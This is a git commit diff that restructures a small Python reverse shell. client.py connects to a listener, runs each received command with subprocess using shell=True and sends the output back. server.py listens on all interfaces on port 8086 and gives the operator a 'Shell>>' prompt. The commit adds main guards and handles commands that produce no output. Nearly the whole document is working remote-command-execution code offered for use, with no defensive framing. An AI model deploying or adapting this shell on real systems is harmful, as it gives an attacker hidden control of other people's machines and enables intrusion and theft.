78073ab6f85059eaf2cff2ec5899a52cfe08f437
sispoof <mbenhamouda099@gmail.com>
2021-12-25 16:15:33 +0100

    handle shell no output

--- client.py
+++ client.py
@@ -1,21 +1,24 @@
 import socket 
 import subprocess
 
-ip = "127.0.0.1" 
-port = 8086
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect((ip,port))
 
-while True:
-   command = s.recv(1024) 
-   if command == b'exit':
-       s.close()
-       break
-   else:
-       #proc = subprocess.check_output(command.decode('utf-8'),shell=True)
-       proc = subprocess.Popen(command.decode('utf-8'), shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-       output = proc.stdout.read()+proc.stderr.read()
-       s.send(output)
-       #s.send(proc)
+if __name__ == '__main__':
+    ip = "127.0.0.1" 
+    port = 8086
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((ip,port))
+
+    while True:
+        command = s.recv(1024) 
+        if command == b'exit':
+            s.close()
+            break
+        else:
+            #proc = subprocess.check_output(command.decode('utf-8'),shell=True)
+            proc = subprocess.Popen(command.decode('utf-8'), shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            output = proc.stdout.read()+proc.stderr.read()
+            output= command if output==b'' else output
+            s.send(output)
+            #s.send(proc)
 
 
--- server.py
+++ server.py
@@ -1,27 +1,30 @@
 import socket 
 #shell to clien
 
-ip = "0.0.0.0"
-port = 8086
+    
+if __name__ == '__main__':
+    ip = "0.0.0.0"
+    port = 8086
 
-s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
 
-s.bind((ip,port))
-s.listen(2)
+    s.bind((ip,port))
+    s.listen(2)
+    print("Waiting for Connection......")
+    conn,addr = s.accept()
+    print('[*] Connected ',addr)
 
-conn,addr = s.accept()
-print('[*] Connected ',addr)
 
-while True:
-    command = input("Shell>>")
-    if command=='exit':
-        conn.send(b'exit')
-        conn.close()
-        break
-    else:
-        conn.send(command.encode())
-        output=conn.recv(1024)
-        print(output.decode('utf-8',errors='ignore'))
+    while True:
+        command = input("Shell>>")
+        if command=='exit':
+            conn.send(b'exit')
+            conn.close()
+            break
+        else:
+            conn.send(command.encode())
+            output=conn.recv(1024)
+            print(output.decode('utf-8',errors='ignore'))
 
 
